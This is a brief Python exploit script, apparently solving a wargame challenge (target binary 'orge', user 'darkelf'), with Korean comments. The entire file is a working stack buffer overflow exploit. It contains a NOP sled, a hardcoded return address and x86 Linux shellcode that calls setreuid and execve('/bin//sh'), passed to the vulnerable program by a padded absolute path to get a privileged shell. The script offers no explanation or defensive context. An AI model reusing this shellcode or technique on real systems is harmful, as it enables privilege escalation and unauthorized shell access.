#RET -> argv[2] : 0xbffffa92 + 100
#payload, 쉘코드
import os 

payload = ""
shellcode = "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80"

def append(_string):
    return payload + _string

#payload
payload = append("\x90"*44)
payload = append("\xf6\xfa\xff\xbf") #RET

#shell
payload = append(' ')
payload = append("\x90"*512)
payload = append(shellcode)

#절대경로
path = "/home/darkelf/" + "/"*59 + "orge"
os.system(path + " " + payload)